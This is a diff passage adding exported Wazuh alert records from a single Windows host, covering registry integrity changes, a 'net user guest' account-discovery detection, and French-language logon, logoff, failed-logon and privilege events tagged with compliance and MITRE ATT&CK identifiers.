+              ],
+              [
+                "GENERIC_ALL",
+                "DELETE",
+                "READ_CONTROL",
+                "WRITE_DAC",
+                "WRITE_OWNER",
+                "READ_DATA",
+                "WRITE_DATA",
+                "APPEND_DATA",
+                "READ_EA",
+                "WRITE_EA",
+                "EXECUTE"
+              ],
+              [
+                "GENERIC_READ",
+                "READ_CONTROL",
+                "READ_DATA",
+                "READ_EA",
+                "WRITE_EA"
+              ],
+              [
+                "GENERIC_READ",
+                "READ_CONTROL",
+                "READ_DATA",
+                "READ_EA",
+                "WRITE_EA"
+              ]
+            ],
+            "name": "Authenticated Users"
+          },
+          {
+            "allowed": [
+              "GENERIC_ALL",
+              "DELETE",
+              "READ_CONTROL",
+              "WRITE_DAC",
+              "WRITE_OWNER",
+              "READ_DATA",
+              "WRITE_DATA",
+              "APPEND_DATA",
+              "READ_EA",
+              "WRITE_EA",
+              "EXECUTE"
+            ],
+            "name": "SYSTEM"
+          },
+          {
+            "allowed": [
+              "GENERIC_ALL",
+              "DELETE",
+              "READ_CONTROL",
+              "WRITE_DAC",
+              "WRITE_OWNER",
+              "READ_DATA",
+              "WRITE_DATA",
+              "APPEND_DATA",
+              "READ_EA",
+              "WRITE_EA",
+              "EXECUTE"
+            ],
+            "name": "Administrateurs"
+          },
+          {
+            "allowed": [
+              "GENERIC_READ",
+              "READ_CONTROL",
+              "READ_DATA",
+              "READ_EA",
+              "WRITE_EA"
+            ],
+            "name": "ALL APPLICATION PACKAGES"
+          },
+          {
+            "allowed": [
+              "GENERIC_READ",
+              "READ_CONTROL",
+              "READ_DATA",
+              "READ_EA",
+              "WRITE_EA"
+            ],
+            "name": "S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681"
+          }
+        ],
+        "mtime_before": "2022-11-30T20:09:09",
+        "event": "modified"
+      },
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "rule": {
+        "mail": false,
+        "level": 5,
+        "pci_dss": [
+          "11.5"
+        ],
+        "hipaa": [
+          "164.312.c.1",
+          "164.312.c.2"
+        ],
+        "tsc": [
+          "PI1.4",
+          "PI1.5",
+          "CC6.1",
+          "CC6.8",
+          "CC7.2",
+          "CC7.3"
+        ],
+        "description": "Registry Key Integrity Checksum Changed",
+        "groups": [
+          "ossec",
+          "syscheck",
+          "syscheck_entry_modified",
+          "syscheck_registry"
+        ],
+        "nist_800_53": [
+          "SI.7"
+        ],
+        "gdpr": [
+          "II_5.1.f"
+        ],
+        "firedtimes": 4,
+        "mitre": {
+          "technique": [
+            "Stored Data Manipulation",
+            "Modify Registry"
+          ],
+          "id": [
+            "T1565.001",
+            "T1112"
+          ],
+          "tactic": [
+            "Impact",
+            "Defense Evasion"
+          ]
+        },
+        "id": "594",
+        "gpg13": [
+          "4.13"
+        ]
+      },
+      "location": "syscheck",
+      "decoder": {
+        "name": "syscheck_registry_key_modified"
+      },
+      "id": "1757613920.1840104",
+      "full_log": "Registry Key '[x32] HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft' modified\nMode: scheduled\nChanged attributes: mtime\nOld modification time was: '1669838949', now it is '1757611773'\n",
+      "timestamp": "2025-09-11T18:05:20.469+0000"
+    },
+    "fields": {
+      "syscheck.mtime_after": [
+        "2025-09-11T17:29:33.000Z"
+      ],
+      "syscheck.mtime_before": [
+        "2022-11-30T20:09:09.000Z"
+      ],
+      "timestamp": [
+        "2025-09-11T18:05:20.469Z"
+      ]
+    },
+    "sort": [
+      1757613920469
+    ]
+  },
+
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.12",
+    "_id": "y0eIPJkBIDwfn7_zKazQ",
+    "_score": null,
+    "_source": {
+      "syscheck": {
+        "mode": "scheduled",
+        "path": "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-408201590-265074577-2736629837-1001",
+        "value_type": "REG_BINARY",
+        "sha1_after": "621a3ee4c0a5f0aa8ac995a0f149e8b00f1e372a",
+        "size_after": "24",
+        "arch": "[x32]",
+        "event": "deleted",
+        "md5_after": "9dba0759361b7d2094d8c909604c92d1",
+        "sha256_after": "b8393b61354d014cd23df766d12d23293bc2c38384aead00793273838861f8e5",
+        "value_name": "\\Device\\HarddiskVolume2\\Windows\\System32\\mmc.exe"
+      },
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "rule": {
+        "mail": false,
+        "level": 5,
+        "pci_dss": [
+          "11.5"
+        ],
+        "hipaa": [
+          "164.312.c.1",
+          "164.312.c.2"
+        ],
+        "tsc": [
+          "PI1.4",
+          "PI1.5",
+          "CC6.1",
+          "CC6.8",
+          "CC7.2",
+          "CC7.3"
+        ],
+        "description": "Registry Value Entry Deleted.",
+        "groups": [
+          "ossec",
+          "syscheck",
+          "syscheck_entry_deleted",
+          "syscheck_registry"
+        ],
+        "nist_800_53": [
+          "SI.7"
+        ],
+        "gdpr": [
+          "II_5.1.f"
+        ],
+        "firedtimes": 23,
+        "mitre": {
+          "technique": [
+            "File Deletion",
+            "Data Destruction",
+            "Modify Registry"
+          ],
+          "id": [
+            "T1070.004",
+            "T1485",
+            "T1112"
+          ],
+          "tactic": [
+            "Defense Evasion",
+            "Impact"
+          ]
+        },
+        "id": "751",
+        "gpg13": [
+          "4.13"
+        ]
+      },
+      "location": "syscheck",
+      "decoder": {
+        "name": "syscheck_registry_value_deleted"
+      },
+      "id": "1757657178.471270",
+      "full_log": "Registry Value '[x32] HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-408201590-265074577-2736629837-1001\\\\Device\\HarddiskVolume2\\Windows\\System32\\mmc.exe' deleted\nMode: scheduled\n",
+      "timestamp": "2025-09-12T06:06:18.056+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-12T06:06:18.056Z"
+      ]
+    },
+    "sort": [
+      1757657178056
+    ]
+  },
+
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.12",
+    "_id": "gkeCPJkBIDwfn7_zBqzn",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "originalFileName": "net1.exe",
+            "image": "C:\\\\Windows\\\\SysWOW64\\\\net1.exe",
+            "product": "Microsoft® Windows® Operating System",
+            "parentProcessGuid": "{994437b3-b6c0-68c3-d629-000000000e00}",
+            "description": "Net Command",
+            "logonGuid": "{994437b3-7443-68b8-e703-000000000000}",
+            "parentCommandLine": "net user guest",
+            "processGuid": "{994437b3-b6c0-68c3-d829-000000000e00}",
+            "logonId": "0x3e7",
+            "parentProcessId": "9724",
+            "processId": "11260",
+            "currentDirectory": "C:\\\\Program Files (x86)\\\\ossec-agent\\\\",
+            "utcTime": "2025-09-12 05:59:28.623",
+            "hashes": "MD5=13C9BF9D300FA7A8EEAE2C21F74DE6F8,SHA256=E692C373C88107B024E5D5481AFE9BBBAEF062FCD4C36E1FD2CA3FC09EC6B663,IMPHASH=FA57EC07C0A8E480F5D417E8860B906D",
+            "parentImage": "C:\\\\Windows\\\\SysWOW64\\\\net.exe",
+            "company": "Microsoft Corporation",
+            "commandLine": "C:\\\\Windows\\\\system32\\\\net1 user guest",
+            "integrityLevel": "System",
+            "fileVersion": "10.0.22621.674 (WinBuild.160101.0800)",
+            "user": "NT AUTHORITY\\\\SYSTEM",
+            "terminalSessionId": "0",
+            "parentUser": "NT AUTHORITY\\\\SYSTEM"
+          },
+          "system": {
+            "eventID": "1",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-12 05:59:28.623\r\nProcessGuid: {994437b3-b6c0-68c3-d829-000000000e00}\r\nProcessId: 11260\r\nImage: C:\\Windows\\SysWOW64\\net1.exe\r\nFileVersion: 10.0.22621.674 (WinBuild.160101.0800)\r\nDescription: Net Command\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: net1.exe\r\nCommandLine: C:\\Windows\\system32\\net1 user guest\r\nCurrentDirectory: C:\\Program Files (x86)\\ossec-agent\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {994437b3-7443-68b8-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=13C9BF9D300FA7A8EEAE2C21F74DE6F8,SHA256=E692C373C88107B024E5D5481AFE9BBBAEF062FCD4C36E1FD2CA3FC09EC6B663,IMPHASH=FA57EC07C0A8E480F5D417E8860B906D\r\nParentProcessGuid: {994437b3-b6c0-68c3-d629-000000000e00}\r\nParentProcessId: 9724\r\nParentImage: C:\\Windows\\SysWOW64\\net.exe\r\nParentCommandLine: net user guest\r\nParentUser: NT AUTHORITY\\SYSTEM\"",
+            "version": "5",
+            "systemTime": "2025-09-12T05:59:28.6251678Z",
+            "eventRecordID": "10521",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "1",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 6,
+        "mail": false,
+        "level": 3,
+        "description": "A net.exe account discovery command was initiated",
+        "groups": [
+          "sysmon",
+          "sysmon_eid1_detections",
+          "windows"
+        ],
+        "mitre": {
+          "technique": [
+            "Account Discovery"
+          ],
+          "id": [
+            "T1087"
+          ],
+          "tactic": [
+            "Discovery"
+          ]
+        },
+        "id": "92039"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757656769.388902",
+      "timestamp": "2025-09-12T05:59:29.601+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-12T05:59:29.601Z"
+      ]
+    },
+    "sort": [
+      1757656769601
+    ]
+  },
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.15",
+    "_id": "vkfHTZkBIDwfn7_zPbom",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "targetLogonId": "0x82cb9e7",
+            "targetUserName": "env-admin",
+            "targetDomainName": "DESKTOP-MDNNEJF",
+            "targetUserSid": "S-1-5-21-408201590-265074577-2736629837-1001",
+            "logonType": "2"
+          },
+          "system": {
+            "eventID": "4634",
+            "keywords": "0x8020000000000000",
+            "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+            "level": "0",
+            "channel": "Security",
+            "opcode": "0",
+            "message": "\"Fermeture de session d’un compte.\r\n\r\nSujet :\r\n\tID de sécurité :\t\tS-1-5-21-408201590-265074577-2736629837-1001\r\n\tNom du compte :\t\tenv-admin\r\n\tDomaine du compte :\t\tDESKTOP-MDNNEJF\r\n\tID du compte :\t\t0x82CB9E7\r\n\r\nType d’ouverture de session :\t\t\t2\r\n\r\nCet événement est généré lorsqu’une session ouverte est supprimée. Il peut être associé à un événement d’ouverture de session en utilisant la valeur ID d’ouverture de session. Les ID d’ouverture de session ne sont uniques qu’entre les redémarrages sur un même ordinateur.\"",
+            "version": "0",
+            "systemTime": "2025-09-15T14:28:38.5277006Z",
+            "eventRecordID": "21147",
+            "threadID": "5216",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "12545",
+            "processID": "756",
+            "severityValue": "AUDIT_SUCCESS",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 2,
+        "mail": false,
+        "level": 3,
+        "description": "Non service account logged off.",
+        "groups": [
+          "windows",
+          " WEF"
+        ],
+        "id": "67023"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757946519.877972",
+      "timestamp": "2025-09-15T14:28:39.570+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-15T14:28:39.570Z"
+      ]
+    },
+    "sort": [
+      1757946519570
+    ]
+  },
+
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.15",
+    "_id": "vEfHTZkBIDwfn7_zPbom",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "subjectLogonId": "0x3e7",
+            "subjectDomainName": "WORKGROUP",
+            "targetLinkedLogonId": "0x82cb9e7",
+            "impersonationLevel": "%%1833",
+            "ipAddress": "127.0.0.1",
+            "authenticationPackageName": "Negotiate",
+            "workstationName": "DESKTOP-MDNNEJF",
+            "targetLogonId": "0x82cba19",
+            "logonProcessName": "User32",
+            "logonGuid": "{00000000-0000-0000-0000-000000000000}",
+            "targetUserName": "env-admin",
+            "keyLength": "0",
+            "elevatedToken": "%%1843",
+            "subjectUserSid": "S-1-5-18",
+            "processId": "0x634",
+            "processName": "C:\\\\Windows\\\\System32\\\\svchost.exe",
+            "ipPort": "0",
+            "targetDomainName": "DESKTOP-MDNNEJF",
+            "targetUserSid": "S-1-5-21-408201590-265074577-2736629837-1001",
+            "virtualAccount": "%%1843",
+            "logonType": "2",
+            "subjectUserName": "DESKTOP-MDNNEJF$"
+          },
+          "system": {
+            "eventID": "4624",
+            "keywords": "0x8020000000000000",
+            "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+            "level": "0",
+            "channel": "Security",
+            "opcode": "0",
+            "message": "\"L'ouverture de session d'un compte s'est correctement déroulée.\r\n\r\nObjet :\r\n\tID de sécurité :\t\tS-1-5-18\r\n\tNom du compte :\t\tDESKTOP-MDNNEJF$\r\n\tDomaine du compte :\t\tWORKGROUP\r\n\tID d'ouverture de session :\t\t0x3E7\r\n\r\nInformations d'ouverture de session :\r\n\tType d'ouverture de session :\t\t2\r\n\tMode administrateur restreint :\t-\r\n\tCredential Guard à distance :\t-\r\n\tCompte virtuel :\t\tNon\r\n\tJeton élevé :\t\tNon\r\n\r\nNiveau d'emprunt d'identité :\t\tEmprunt d’identité\r\n\r\nNouvelle ouverture de session :\r\n\tID de sécurité :\t\tS-1-5-21-408201590-265074577-2736629837-1001\r\n\tNom du compte :\t\tenv-admin\r\n\tDomaine du compte :\t\tDESKTOP-MDNNEJF\r\n\tID d'ouverture de session :\t\t0x82CBA19\r\n\tID d'ouverture de session liée :\t\t0x82CB9E7\r\n\tNom du compte réseau :\t-\r\n\tDomaine du compte réseau :\t-\r\n\tGUID d'ouverture de session :\t\t{00000000-0000-0000-0000-000000000000}\r\n\r\nInformations sur le processus :\r\n\tID du processus :\t\t0x634\r\n\tNom du processus :\t\tC:\\Windows\\System32\\svchost.exe\r\n\r\nInformations sur le réseau :\r\n\tNom de la station de travail :\tDESKTOP-MDNNEJF\r\n\tAdresse du réseau source :\t127.0.0.1\r\n\tPort source :\t\t0\r\n\r\nInformations détaillées sur l'authentification :\r\n\tProcessus d'ouverture de session :\t\tUser32 \r\n\tPackage d'authentification :\tNegotiate\r\n\tServices en transit :\t-\r\n\tNom du package (NTLM uniquement) :\t-\r\n\tLongueur de la clé :\t\t0\r\n\r\nCet événement est généré lors de la création d'une ouverture de session. Il est généré sur l'ordinateur sur lequel l'ouverture de session a été effectuée.\r\n\r\nLe champ Objet indique le compte sur le système local qui a demandé l'ouverture de session. Il s'agit le plus souvent d'un service, comme le service Serveur, ou un processus local tel que Winlogon.exe ou Services.exe.\r\n\r\nLe champ Type d'ouverture de session indique le type d'ouverture de session qui s'est produit. Les types les plus courants sont 2 (interactif) et 3 (réseau).\r\n\r\nLe champ Nouvelle ouverture de session indique le compte pour lequel la nouvelle ouverture de session a été créée, par exemple, le compte qui s'est connecté.\r\n\r\nLes champs relatifs au réseau indiquent la provenance d'une demande d'ouverture de session à distance. Le nom de la station de travail n'étant pas toujours disponible, peut être laissé vide dans certains cas.\r\n\r\nLe champ du niveau d'emprunt d'identité indique la portée de l'emprunt d'identité que peut prendre un processus dans la session d'ouverture de session.\r\n\r\nLes champs relatifs aux informations d'authentification fournissent des détails sur cette demande d'ouverture de session spécifique.\r\n\t- Le GUID d'ouverture de session est un identificateur unique pouvant servir à associer cet événement à un événement KDC .\r\n\t- Les services en transit indiquent les services intermédiaires qui ont participé à cette demande d'ouverture de session.\r\n\t- Nom du package indique quel est le sous-protocole qui a été utilisé parmi les protocoles NTLM.\r\n\t- La longueur de la clé indique la longueur de la clé de session générée. Elle a la valeur 0 si aucune clé de session n'a été demandée.\"",
+            "version": "3",
+            "systemTime": "2025-09-15T14:28:38.5216776Z",
+            "eventRecordID": "21144",
+            "threadID": "5216",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "12544",
+            "processID": "756",
+            "severityValue": "AUDIT_SUCCESS",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          }
+        }
+      },
+      "rule": {
+        "mail": false,
+        "level": 3,
+        "pci_dss": [
+          "10.2.5"
+        ],
+        "hipaa": [
+          "164.312.b"
+        ],
+        "tsc": [
+          "CC6.8",
+          "CC7.2",
+          "CC7.3"
+        ],
+        "description": "Windows Workstation Logon Success",
+        "groups": [
+          "windows",
+          "windows_security",
+          "authentication_success"
+        ],
+        "nist_800_53": [
+          "AU.14",
+          "AC.9"
+        ],
+        "gdpr": [
+          "IV_32.2"
+        ],
+        "firedtimes": 2,
+        "mitre": {
+          "technique": [
+            "Valid Accounts"
+          ],
+          "id": [
+            "T1078"
+          ],
+          "tactic": [
+            "Defense Evasion",
+            "Persistence",
+            "Privilege Escalation",
+            "Initial Access"
+          ]
+        },
+        "id": "60118",
+        "gpg13": [
+          "7.1",
+          "7.2"
+        ]
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757946519.865952",
+      "timestamp": "2025-09-15T14:28:39.558+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-15T14:28:39.558Z"
+      ]
+    },
+    "sort": [
+      1757946519558
+    ]
+  },
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.15",
+    "_id": "uUfHTZkBIDwfn7_zAroW",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "subjectLogonId": "0x3e7",
+            "subjectDomainName": "WORKGROUP",
+            "ipAddress": "127.0.0.1",
+            "authenticationPackageName": "Negotiate",
+            "workstationName": "DESKTOP-MDNNEJF",
+            "subStatus": "0xc000006a",
+            "logonProcessName": "User32",
+            "targetUserName": "env-admin",
+            "keyLength": "0",
+            "subjectUserSid": "S-1-5-18",
+            "processId": "0x634",
+            "processName": "C:\\\\Windows\\\\System32\\\\svchost.exe",
+            "ipPort": "0",
+            "failureReason": "%%2313",
+            "targetDomainName": "DESKTOP-MDNNEJF",
+            "targetUserSid": "S-1-0-0",
+            "logonType": "2",
+            "subjectUserName": "DESKTOP-MDNNEJF$",
+            "status": "0xc000006d"
+          },
+          "system": {
+            "eventID": "4625",
+            "keywords": "0x8010000000000000",
+            "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+            "level": "0",
+            "channel": "Security",
+            "opcode": "0",
+            "message": "\"Échec d’ouverture de session d’un compte.\r\n\r\nSujet :\r\n\tID de sécurité :\t\tS-1-5-18\r\n\tNom du compte :\t\tDESKTOP-MDNNEJF$\r\n\tDomaine du compte :\t\tWORKGROUP\r\n\tID d’ouverture de session :\t\t0x3E7\r\n\r\nType d’ouverture de session :\t\t\t2\r\n\r\nCompte pour lequel l’ouverture de session a échoué :\r\n\tID de sécurité :\t\tS-1-0-0\r\n\tNom du compte :\t\tenv-admin\r\n\tDomaine du compte :\t\tDESKTOP-MDNNEJF\r\n\r\nInformations sur l’échec :\r\n\tRaison de l’échec :\t\tNom d’utilisateur inconnu ou mot de passe incorrect.\r\n\tÉtat :\t\t\t0xC000006D\r\n\tSous-état :\t\t0xC000006A\r\n\r\nInformations sur le processus :\r\n\tID du processus de l’appelant :\t0x634\r\n\tNom du processus de l’appelant :\tC:\\Windows\\System32\\svchost.exe\r\n\r\nInformations sur le réseau :\r\n\tNom de la station de travail :\tDESKTOP-MDNNEJF\r\n\tAdresse du réseau source :\t127.0.0.1\r\n\tPort source :\t\t0\r\n\r\nInformations détaillées sur l’authentification :\r\n\tProcessus d’ouverture de session :\t\tUser32 \r\n\tPackage d’authentification :\tNegotiate\r\n\tServices en transit :\t-\r\n\tNom du package (NTLM uniquement) :\t-\r\n\tLongueur de clé :\t\t0\r\n\r\nCet événement est généré lorsqu’une demande d’ouverture de session échoue. Il est généré sur l’ordinateur sur lequel l’accès a été tenté.\r\n\r\nLe champ Objet indique le compte sur le système local qui a demandé l’ouverture de session. Il s’agit le plus souvent d’un service, comme le service Serveur, ou un processus local tel que Winlogon.exe ou Services.exe.\r\n\r\nLe champ Type d’ouverture de session indique le type d’ouverture de session qui a été demandé. Les types les plus courants sont 2 (interactif) et 3 (réseau).\r\n\r\nLes champs relatifs aux informations sur le processus indiquent quel est le compte et le processus sur le système qui ont demandé l’ouverture de session.\r\n\r\nLes champs relatifs aux informations sur le réseau indiquent la provenance de la demande d’ouverture de session distante. Le nom de la station de travail n’étant pas toujours disponible, peut rester vide dans certains cas.\r\n\r\nLes champs relatifs aux informations d’authentification fournissent des détails sur cette demande d’ouverture de session spécifique.\r\n\t- Les services en transit indiquent les services intermédiaires qui ont participé à cette demande d’ouverture de session.\r\n\t- Le nom du package indique quel a été le sous-protocole qui a été utilisé parmi les protocoles NTLM.\r\n\t- La longueur de la clé indique la longueur de la clé de session générée. Elle a la valeur 0 si aucune clé de session n’a été demandée.\"",
+            "version": "0",
+            "systemTime": "2025-09-15T14:28:27.9395009Z",
+            "eventRecordID": "21141",
+            "threadID": "5216",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "12544",
+            "processID": "756",
+            "severityValue": "AUDIT_FAILURE",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          }
+        }
+      },
+      "rule": {
+        "mail": false,
+        "level": 5,
+        "pci_dss": [
+          "10.2.4",
+          "10.2.5"
+        ],
+        "hipaa": [
+          "164.312.b"
+        ],
+        "tsc": [
+          "CC6.1",
+          "CC6.8",
+          "CC7.2",
+          "CC7.3"
+        ],
+        "description": "Logon Failure - Unknown user or bad password",
+        "groups": [
+          "windows",
+          "windows_security",
+          "authentication_failed"
+        ],
+        "nist_800_53": [
+          "AU.14",
+          "AC.7"
+        ],
+        "gdpr": [
+          "IV_35.7.d",
+          "IV_32.2"
+        ],
+        "firedtimes": 2,
+        "mitre": {
+          "technique": [
+            "Account Access Removal"
+          ],
+          "id": [
+            "T1531"
+          ],
+          "tactic": [
+            "Impact"
+          ]
+        },
+        "id": "60122",
+        "gpg13": [
+          "7.1"
+        ]
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757946508.845453",
+      "timestamp": "2025-09-15T14:28:28.933+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-15T14:28:28.933Z"
+      ]
+    },
+    "sort": [
+      1757946508933
+    ]
+  },
+
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.15",
+    "_id": "u0fHTZkBIDwfn7_zPbom",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "subjectLogonId": "0x82cb9e7",
+            "subjectUserSid": "S-1-5-21-408201590-265074577-2736629837-1001",
+            "subjectDomainName": "DESKTOP-MDNNEJF",
+            "privilegeList": "SeSecurityPrivilege     SeTakeOwnershipPrivilege     SeLoadDriverPrivilege     SeBackupPrivilege     SeRestorePrivilege     SeDebugPrivilege     SeSystemEnvironmentPrivilege     SeImpersonatePrivilege     SeDelegateSessionUserImpersonatePrivilege",
+            "subjectUserName": "env-admin"
+          },
+          "system": {
+            "eventID": "4672",
+            "keywords": "0x8020000000000000",
+            "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+            "level": "0",
+            "channel": "Security",
+            "opcode": "0",
+            "message": "\"Privilèges spéciaux attribués à la nouvelle ouverture de session.\r\n\r\nSujet :\r\n\tID de sécurité :\t\tS-1-5-21-408201590-265074577-2736629837-1001\r\n\tNom du compte :\t\tenv-admin\r\n\tDomaine du compte :\t\tDESKTOP-MDNNEJF\r\n\tID d’ouverture de session :\t\t0x82CB9E7\r\n\r\nPrivilèges :\t\tSeSecurityPrivilege\r\n\t\t\tSeTakeOwnershipPrivilege\r\n\t\t\tSeLoadDriverPrivilege\r\n\t\t\tSeBackupPrivilege\r\n\t\t\tSeRestorePrivilege\r\n\t\t\tSeDebugPrivilege\r\n\t\t\tSeSystemEnvironmentPrivilege\r\n\t\t\tSeImpersonatePrivilege\r\n\t\t\tSeDelegateSessionUserImpersonatePrivilege\"",
+            "version": "0",
+            "systemTime": "2025-09-15T14:28:38.5217145Z",
+            "eventRecordID": "21145",
+            "threadID": "5216",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "12548",
+            "processID": "756",
+            "severityValue": "AUDIT_SUCCESS",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 1,
+        "mail": false,
+        "level": 3,
+        "description": "Special privileges assigned to new logon.",
+        "groups": [
+          "windows",
+          " WEF"
+        ],
+        "mitre": {
+          "technique": [
+            "Domain Policy Modification"
+          ],
+          "id": [
+            "T1484"
+          ],
+          "tactic": [
+            "Defense Evasion",
+            "Privilege Escalation"
+          ]
+        },
+        "id": "67028"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757946519.862756",
+      "timestamp": "2025-09-15T14:28:39.553+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-15T14:28:39.553Z"
+      ]
+    },
+    "sort": [
+      1757946519553
+    ]
+  },
+
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.15",
+    "_id": "uUfHTZkBIDwfn7_zAroW",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "subjectLogonId": "0x3e7",
+            "subjectDomainName": "WORKGROUP",
+            "ipAddress": "127.0.0.1",
+            "authenticationPackageName": "Negotiate",
+            "workstationName": "DESKTOP-MDNNEJF",
+            "subStatus": "0xc000006a",
+            "logonProcessName": "User32",
+            "targetUserName": "env-admin",
+            "keyLength": "0",
+            "subjectUserSid": "S-1-5-18",
+            "processId": "0x634",
+            "processName": "C:\\\\Windows\\\\System32\\\\svchost.exe",
+            "ipPort": "0",
+            "failureReason": "%%2313",
+            "targetDomainName": "DESKTOP-MDNNEJF",
+            "targetUserSid": "S-1-0-0",
+            "logonType": "2",
+            "subjectUserName": "DESKTOP-MDNNEJF$",
+            "status": "0xc000006d"
+          },
+          "system": {
+            "eventID": "4625",
+            "keywords": "0x8010000000000000",
+            "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+            "level": "0",
+            "channel": "Security",
+            "opcode": "0",
+            "message": "\"Échec d’ouverture de session d’un compte.\r\n\r\nSujet :\r\n\tID de sécurité :\t\tS-1-5-18\r\n\tNom du compte :\t\tDESKTOP-MDNNEJF$\r\n\tDomaine du compte :\t\tWORKGROUP\r\n\tID d’ouverture de session :\t\t0x3E7\r\n\r\nType d’ouverture de session :\t\t\t2\r\n\r\nCompte pour lequel l’ouverture de session a échoué :\r\n\tID de sécurité :\t\tS-1-0-0\r\n\tNom du compte :\t\tenv-admin\r\n\tDomaine du compte :\t\tDESKTOP-MDNNEJF\r\n\r\nInformations sur l’échec :\r\n\tRaison de l’échec :\t\tNom d’utilisateur inconnu ou mot de passe incorrect.\r\n\tÉtat :\t\t\t0xC000006D\r\n\tSous-état :\t\t0xC000006A\r\n\r\nInformations sur le processus :\r\n\tID du processus de l’appelant :\t0x634\r\n\tNom du processus de l’appelant :\tC:\\Windows\\System32\\svchost.exe\r\n\r\nInformations sur le réseau :\r\n\tNom de la station de travail :\tDESKTOP-MDNNEJF\r\n\tAdresse du réseau source :\t127.0.0.1\r\n\tPort source :\t\t0\r\n\r\nInformations détaillées sur l’authentification :\r\n\tProcessus d’ouverture de session :\t\tUser32 \r\n\tPackage d’authentification :\tNegotiate\r\n\tServices en transit :\t-\r\n\tNom du package (NTLM uniquement) 